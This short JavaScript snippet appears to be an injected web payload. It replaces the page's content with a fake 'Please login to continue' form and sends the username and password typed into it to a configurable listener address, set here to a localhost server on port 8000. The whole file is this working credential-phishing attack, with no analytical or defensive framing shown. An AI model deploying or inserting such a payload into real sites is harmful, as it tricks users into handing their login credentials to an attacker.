var protocol = "http";
var server = "127.0.0.1";
var port = "8000";

var remoteAddr = protocol+"://"+server+":"+port+"/";

function fakeLogin(listener){
    document.body.innerHTML = "</br></br><h1>Please login to continue</h1><form action="+listener+" method='get'><label usern='usern'>Username:</label><input name='usern'id='usern'><label passw='passw'>Password:</label><input name='passw'id='passw'><button>Submit</button></form>"; //must be on one line
}
fakeLogin(remoteAddr);
